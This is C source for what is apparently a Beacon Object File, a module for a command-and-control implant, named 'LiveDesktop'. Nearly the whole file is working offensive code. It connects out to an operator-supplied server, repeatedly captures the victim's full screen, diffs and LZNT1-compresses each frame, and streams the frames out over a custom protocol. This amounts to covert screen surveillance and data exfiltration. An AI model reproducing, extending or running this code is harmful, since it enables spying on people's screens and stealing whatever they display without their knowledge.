#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#ifdef BOF

/* beacon API */
typedef struct {
    char * original;
    char * buffer;
    int    length;
    int    size;
} datap;

DECLSPEC_IMPORT void   BeaconDataParse(datap * parser, char * buffer, int size);
DECLSPEC_IMPORT int    BeaconDataInt(datap * parser);
DECLSPEC_IMPORT char * BeaconDataExtract(datap * parser, int * size);
DECLSPEC_IMPORT void   BeaconPrintf(int type, const char * fmt, ...);

#define CALLBACK_OUTPUT 0x0
#define CALLBACK_ERROR  0x0d

/* DFR declarations */

/* MSVCRT */
DECLSPEC_IMPORT void * __cdecl MSVCRT$memcpy(void *, const void *, size_t);
DECLSPEC_IMPORT void * __cdecl MSVCRT$memset(void *, int, size_t);
DECLSPEC_IMPORT int    __cdecl MSVCRT$memcmp(const void *, const void *, size_t);

/* WS2_32 */
DECLSPEC_IMPORT int    WSAAPI WS2_32$WSAStartup(WORD, LPWSADATA);
DECLSPEC_IMPORT SOCKET WSAAPI WS2_32$socket(int, int, int);
DECLSPEC_IMPORT int    WSAAPI WS2_32$connect(SOCKET, const struct sockaddr *, int);
DECLSPEC_IMPORT int    WSAAPI WS2_32$send(SOCKET, const char *, int, int);
DECLSPEC_IMPORT int    WSAAPI WS2_32$recv(SOCKET, char *, int, int);
DECLSPEC_IMPORT int    WSAAPI WS2_32$closesocket(SOCKET);
DECLSPEC_IMPORT u_short WSAAPI WS2_32$htons(u_short);
DECLSPEC_IMPORT unsigned long WSAAPI WS2_32$inet_addr(const char *);
DECLSPEC_IMPORT int    WSAAPI WS2_32$WSACleanup(void);

/* KERNEL32 */
WINBASEAPI void * WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI int    WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap(void);
WINBASEAPI void * WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
WINBASEAPI BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, PVOID);
WINBASEAPI VOID   WINAPI KERNEL32$Sleep(DWORD);

/* USER32 */
DECLSPEC_IMPORT HDC  WINAPI USER32$GetDC(HWND);
DECLSPEC_IMPORT int  WINAPI USER32$ReleaseDC(HWND, HDC);
DECLSPEC_IMPORT int  WINAPI USER32$GetSystemMetrics(int);

/* GDI32 */
DECLSPEC_IMPORT HDC     WINAPI GDI32$CreateCompatibleDC(HDC);
DECLSPEC_IMPORT HBITMAP WINAPI GDI32$CreateCompatibleBitmap(HDC, int, int);
DECLSPEC_IMPORT HGDIOBJ WINAPI GDI32$SelectObject(HDC, HGDIOBJ);
DECLSPEC_IMPORT BOOL    WINAPI GDI32$BitBlt(HDC, int, int, int, int, HDC, int, int, DWORD);
DECLSPEC_IMPORT int     WINAPI GDI32$GetDIBits(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, UINT);
DECLSPEC_IMPORT BOOL    WINAPI GDI32$DeleteDC(HDC);
DECLSPEC_IMPORT BOOL    WINAPI GDI32$DeleteObject(HGDIOBJ);

/* NTDLL — LZNT1 compression */
typedef NTSTATUS (NTAPI *RtlCompressBuffer_t)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, ULONG, PULONG, PVOID);
typedef NTSTATUS (NTAPI *RtlGetCompressionWorkSpaceSize_t)(USHORT, PULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlCompressBuffer(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, ULONG, PULONG, PVOID);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlGetCompressionWorkSpaceSize(USHORT, PULONG, PULONG);

/* Route memcpy/memset through MSVCRT — large BOFs emit calls the loader can't resolve */
void * __cdecl memcpy(void *dest, const void *src, size_t n)
{
    return MSVCRT$memcpy(dest, src, n);
}
void * __cdecl memset(void *dest, int c, size_t n)
{
    MSVCRT$memset(dest, c, n);
    return dest;
}

#define intAlloc(sz)  KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (sz))
#define intFree(p)    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, (p))

/* Color key for pixel diff — BGR (255, 174, 201) */
#define CK_B 255
#define CK_G 174
#define CK_R 201

static int send_all(SOCKET s, const char *buf, int len)
{
    int total = 0;
    while (total < len) {
        int n = WS2_32$send(s, buf + total, len - total, 0);
        if (n <= 0) return -1;
        total += n;
    }
    return total;
}

static int recv_all(SOCKET s, char *buf, int len)
{
    int total = 0;
    while (total < len) {
        int n = WS2_32$recv(s, buf + total, len - total, 0);
        if (n <= 0) return -1;
        total += n;
    }
    return total;
}

static int send_i32(SOCKET s, int v)
{
    return send_all(s, (const char *)&v, 4);
}

static int recv_i32(SOCKET s, int *v)
{
    return recv_all(s, (char *)v, 4);
}

void go(char *args, int alen)
{
    datap parser;
    char *server = NULL;
    int   serverLen = 0;
    int   port = 0;

    BeaconDataParse(&parser, args, alen);
    server = BeaconDataExtract(&parser, &serverLen);
    port   = BeaconDataInt(&parser);

    if (!server || port <= 0 || port > 65535) {
        BeaconPrintf(CALLBACK_ERROR, "LiveDesktop: bad args (server=%s port=%d)", server ? server : "null", port);
        return;
    }

    /* Init winsock */
    WSADATA wsa;
    if (WS2_32$WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "LiveDesktop: WSAStartup failed");
        return;
    }

    SOCKET sock = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        BeaconPrintf(CALLBACK_ERROR, "LiveDesktop: socket() failed");
        WS2_32$WSACleanup();
        return;
    }

    struct sockaddr_in addr;
    MSVCRT$memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port   = WS2_32$htons((u_short)port);
    addr.sin_addr.s_addr = WS2_32$inet_addr(server);

    if (WS2_32$connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "LiveDesktop: connect to %s:%d failed", server, port);
        WS2_32$closesocket(sock);
        WS2_32$WSACleanup();
        return;
    }

    /* Handshake: magic + connection type */
    char magic[7] = { 'L','V','D','K','T','P', 0 };
    if (send_all(sock, magic, 7) < 0) goto cleanup;
    int connType = 0; /* desktop */
    if (send_i32(sock, connType) < 0) goto cleanup;

    /* Get LZNT1 workspace size */
    ULONG wsSize = 0, fragSize = 0;
    NTDLL$RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1, &wsSize, &fragSize);
    PVOID workspace = intAlloc(wsSize);
    if (!workspace) {
        BeaconPrintf(CALLBACK_ERROR, "LiveDesktop: workspace alloc failed");
        goto cleanup;
    }

    BYTE *prevFrame = NULL;
    int   prevSize  = 0;
    int   frameNum  = 0;

    /* Frame loop */
    for (;;)
    {
        int reqW = 0, reqH = 0;
        if (recv_i32(sock, &reqW) < 0) break;
        if (recv_i32(sock, &reqH) < 0) break;

        /* Get screen dimensions */
        int screenW = USER32$GetSystemMetrics(0); /* SM_CXSCREEN */
        int screenH = USER32$GetSystemMetrics(1); /* SM_CYSCREEN */
        int frameW  = (screenW + 3) & ~3; /* DWORD-align */
        int frameH  = screenH;
        int stride  = frameW * 3;
        int rawSize = stride * frameH;

        /* Capture screen */
        HDC hdcScreen = USER32$GetDC(NULL);
        HDC hdcMem    = GDI32$CreateCompatibleDC(hdcScreen);
        HBITMAP hBmp  = GDI32$CreateCompatibleBitmap(hdcScreen, frameW, frameH);
        HGDIOBJ hOld  = GDI32$SelectObject(hdcMem, hBmp);

        GDI32$BitBlt(hdcMem, 0, 0, screenW, screenH, hdcScreen, 0, 0, SRCCOPY);

        /* Get pixel data — 24-bit BGR bottom-up */
        BITMAPINFOHEADER bmi;
        MSVCRT$memset(&bmi, 0, sizeof(bmi));
        bmi.biSize        = sizeof(BITMAPINFOHEADER);
        bmi.biWidth       = frameW;
        bmi.biHeight      = frameH; /* positive = bottom-up */
        bmi.biPlanes      = 1;
        bmi.biBitCount    = 24;
        bmi.biCompression = BI_RGB;

        BYTE *pixels = (BYTE *)intAlloc(rawSize);
        if (!pixels) {
            GDI32$SelectObject(hdcMem, hOld);
            GDI32$DeleteObject(hBmp);
            GDI32$DeleteDC(hdcMem);
            USER32$ReleaseDC(NULL, hdcScreen);
            break;
        }

        GDI32$GetDIBits(hdcScreen, hBmp, 0, frameH, pixels, (BITMAPINFO *)&bmi, DIB_RGB_COLORS);

        GDI32$SelectObject(hdcMem, hOld);
        GDI32$DeleteObject(hBmp);
        GDI32$DeleteDC(hdcMem);
        USER32$ReleaseDC(NULL, hdcScreen);

        /* Pixel diff against previous frame */
        if (prevFrame && prevSize == rawSize && frameNum > 0)
        {
            for (int i = 0; i + 2 < rawSize; i += 3)
            {
                if (pixels[i] == prevFrame[i] &&
                    pixels[i+1] == prevFrame[i+1] &&
                    pixels[i+2] == prevFrame[i+2])
                {
                    pixels[i]   = CK_B;
                    pixels[i+1] = CK_G;
                    pixels[i+2] = CK_R;
                }
            }
        }

        /* Save current as previous (before we send the diff) */
        if (!prevFrame || prevSize != rawSize) {
            if (prevFrame) intFree(prevFrame);
            prevFrame = (BYTE *)intAlloc(rawSize);
            prevSize  = rawSize;
        }
        if (prevFrame) {
            /* For the prev buffer we need the ORIGINAL pixels, not the diff.
               On first frame pixels IS the original. On subsequent frames
               we need to reconstruct: unchanged pixels keep prevFrame value,
               changed pixels take the new value from pixels[] (non-colorkey). */
            if (frameNum == 0) {
                MSVCRT$memcpy(prevFrame, pixels, rawSize);
            } else {
                for (int i = 0; i + 2 < rawSize; i += 3) {
                    if (!(pixels[i] == CK_B && pixels[i+1] == CK_G && pixels[i+2] == CK_R)) {
                        prevFrame[i]   = pixels[i];
                        prevFrame[i+1] = pixels[i+1];
                        prevFrame[i+2] = pixels[i+2];
                    }
                }
            }
        }

        /* Compress with LZNT1 */
        ULONG compBufSize = rawSize + (rawSize / 16) + 256;
        BYTE *compBuf = (BYTE *)intAlloc(compBufSize);
        ULONG compSize = 0;
        if (!compBuf) {
            intFree(pixels);
            break;
        }

        NTSTATUS st = NTDLL$RtlCompressBuffer(
            COMPRESSION_FORMAT_LZNT1,
            pixels, rawSize,
            compBuf, compBufSize,
            4096, &compSize, workspace
        );

        intFree(pixels);

        if (st != 0) {
            intFree(compBuf);
            /* Send flag=0 (no change) and continue */
            send_i32(sock, 0);
            int ack;
            recv_i32(sock, &ack);
            continue;
        }

        /* Send frame: flag, screenW, screenH, frameW, frameH, compressedSize, data */
        if (send_i32(sock, 1) < 0)        { intFree(compBuf); break; }
        if (send_i32(sock, screenW) < 0)   { intFree(compBuf); break; }
        if (send_i32(sock, screenH) < 0)   { intFree(compBuf); break; }
        if (send_i32(sock, frameW) < 0)    { intFree(compBuf); break; }
        if (send_i32(sock, frameH) < 0)    { intFree(compBuf); break; }
        if (send_i32(sock, (int)compSize) < 0) { intFree(compBuf); break; }
        if (send_all(sock, (const char *)compBuf, (int)compSize) < 0) { intFree(compBuf); break; }

        intFree(compBuf);

        /* Wait for ack */
        int ack = 0;
        if (recv_i32(sock, &ack) < 0) break;

        frameNum++;
    }

    if (prevFrame) intFree(prevFrame);
    if (workspace) intFree(workspace);

cleanup:
    WS2_32$closesocket(sock);
    WS2_32$WSACleanup();
}

#endif /* BOF */
